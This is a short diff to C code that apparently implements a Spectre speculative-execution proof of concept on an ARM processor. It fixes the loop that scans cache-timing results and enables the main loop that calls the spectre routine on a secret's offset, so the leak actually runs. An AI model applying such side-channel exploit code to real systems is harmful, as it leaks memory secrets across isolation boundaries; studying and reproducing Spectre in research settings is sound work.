@@ -89,7 +89,7 @@ void spectre(size_t offset){
 	}
 	//int max_value = 0;
 	//int max_char = 0;
-	for(i = buffer_size; i<256; i++){
+	for(i = 0; i<256; i++){
 		/*if(results[i] > max_value){
 			max_value = results[i];
 			max_char = i;
@@ -111,7 +111,7 @@ int main(int argc, const char**argv){
   asm volatile ("DSB SY");
 
   size_t secret_offset = (size_t)(secret - (char*)buffer);
-	for(int i=0; i<0; i++){ // length of secret is known
+	for(int i=0; i<1; i++){ // length of secret is known
   	spectre(secret_offset+i);
 	}
   return 0;
